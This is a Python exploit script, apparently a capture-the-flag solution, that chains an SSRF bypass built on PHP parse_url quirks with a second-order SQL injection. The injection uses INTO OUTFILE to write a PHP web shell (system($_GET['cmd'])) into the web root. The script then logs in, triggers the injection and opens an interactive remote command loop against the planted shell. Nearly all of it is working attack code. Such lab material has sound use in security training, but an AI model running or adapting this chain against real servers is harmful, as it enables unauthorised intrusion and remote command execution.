import requests
import sys


# BASE_URL = "http://154.57.164.83:32169"
BASE_URL = "http://localhost:1337"
LOGIN_URL = f"{BASE_URL}/login.php"
COMM_URL = f"{BASE_URL}/communicate.php"

# Instead of "localhost:80" we use directly "127.0.0.1:80" since on remote the
# timer is stricter and we want to avoid any potential issue with DNS resolution.
# In local, the timer is more relaxed and we can use "localhost:80" without any issue.
SSRF_TARGET = "0://127.0.0.1:80;motherland.com:80/"


'''
A known security issue (Bug #73192) involved parse_url() incorrectly parsing URLs like http://example.com:80#@google.com/,
where # was misinterpreted as terminating the authority component.
This was fixed in PHP 7.1, but earlier versions could return google.com as the host,
enabling bypasses for authentication and open redirects.
'''

# Useful links:
#   - https://medium.com/@themiddleblue/php-ssrf-techniques-9d422cb28d51
#   - https://bugs.php.net/bug.php?id=73192
def solve():
    name = "vego"
    username = "vego"
    password = "vego"
    session = requests.Session()

    # If the -r flag is provided, we attempt to register a new user before logging in
    if len(sys.argv) > 1 and sys.argv[1] == "-r":
        print(f"[*] Signing in as {username} with password {password} and name {name}...")
        data = {"name": name, "username": username, "password": password}
        res = session.post(f"{BASE_URL}/register.php", data=data)
        
        if res.url == LOGIN_URL:
            print("[+] Registration successful.")
        else:
            print("[-] Registration failed.")
            exit(-1)

    print(f"[*] Logging in as {username}...")
    data = {"username": username, "password": password}
    res = session.post(LOGIN_URL, data=data)
    
    if "Logout" in res.text:
        print("[+] Login successful.")
    else:
        print("[-] Login failed.")
        exit(-1)
    
    # We use the 'data' array in communicate.php to send POST params to index.php
    # index.php requires 'action=edit' and 'new_name=<new_name>'
    # The payload will break out the intended query and write a PHP shell file to the web root.
    payload = "' UNION SELECT '<?php system($_GET[\"cmd\"]); die(); ?>', 2, 3, 4, 5 INTO OUTFILE '/var/www/html/shell.php' -- -"
    payload_data = {
        "url": SSRF_TARGET,
        "data[action]": "edit",
        "data[new_name]": payload
    }
    
    print("[*] Injecting payload for SQLi...")
    session.post(COMM_URL, data=payload_data)
    
    # Visit index.php to trigger the SQLi and retrieve the output.
    # When we call `searchUser(?)`` from PHP, the parameter is passed safely to the database.
    # However, once inside the database, the CONCAT function takes your malicious string and builds a new,
    # unsanitized query string. This effectively "unwraps" the protection provided by PHP.
    print("[*] Triggering execution...")
    session.get(f"{BASE_URL}/index.php")

    print("[*] Accessing the web shell...")
    while True:
        cmd = input("shell> ")
        if cmd.lower() in ["exit", "quit"]:
            break

        response = session.get(f"{BASE_URL}/shell.php", params={"cmd": cmd})
        print(response.text)


if __name__ == "__main__":
    solve()
